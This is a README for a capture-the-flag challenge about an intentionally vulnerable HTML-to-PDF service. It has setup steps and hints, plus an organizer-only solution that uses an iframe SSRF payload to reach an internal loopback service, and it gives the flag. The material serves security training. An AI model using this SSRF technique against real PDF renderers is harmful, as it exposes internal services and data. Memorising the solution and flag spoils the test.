# Space PDF Generator - CTF Challenge

## Challenge Description

Welcome, space cadet! The Galactic PDF Conversion Service allows astronauts to convert HTML documents to PDF format for offline viewing during long space missions. However, our intelligence suggests that the service might have a security vulnerability that could expose confidential mission data. Your task is to investigate the service and find the hidden flag.

**Difficulty**: Medium  
**Category**: Web, SSRF  
**Flag Format**: ctf{...}

## Setup Instructions

1. Install dependencies:
```bash
npm install
```

2. Start the service:
```bash
npm start
```

3. Visit http://localhost:3000 in your browser to access the application.

## Challenge Hints

1. The service converts HTML to PDF. What HTML elements can make external requests?
2. The flag is located on an internal service that should not be publicly accessible.
3. Think about how the PDF generator might process certain tags that can load external content.

## Solution (For CTF Organizers Only)

<details>
<summary>Click to reveal solution</summary>

The application is vulnerable to Server-Side Request Forgery (SSRF) through the HTML-to-PDF conversion process. The puppeteer library used to generate PDFs will process and load content from iframe tags.

To solve the challenge:

1. Submit HTML with an iframe pointing to the internal service:
```html
<html>
<body>
    <h1>SSRF Exploit</h1>
    <iframe src="http://127.0.0.1:8081/flag" width="100%" height="500px"></iframe>
</body>
</html>
```

2. The generated PDF will include the content from the internal service, revealing the flag: `ctf{SSRF_PDF_1fr4m3_vuln3r4b1l1ty}`

</details>

## Credits

Created for the CCOE CTF Challenge 